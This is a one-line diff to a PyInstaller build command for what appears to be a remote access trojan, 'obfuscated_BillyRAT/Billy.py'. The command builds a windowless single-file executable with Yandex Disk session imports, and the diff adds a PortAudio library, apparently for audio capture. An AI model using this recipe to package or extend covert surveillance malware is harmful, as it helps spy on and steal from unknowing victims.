@@ -1,1 +1,1 @@
-python3 -m PyInstaller  --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session  --onefile obfuscated_BillyRAT/Billy.py
+python3 -m PyInstaller  --noconsole --hidden-import=yadisk.sessions --hidden-import=yadisk.sessions.requests_session --add-binary "/usr/lib/x86_64-linux-gnu/libportaudio.so.2:." --onefile obfuscated_BillyRAT/Billy.py
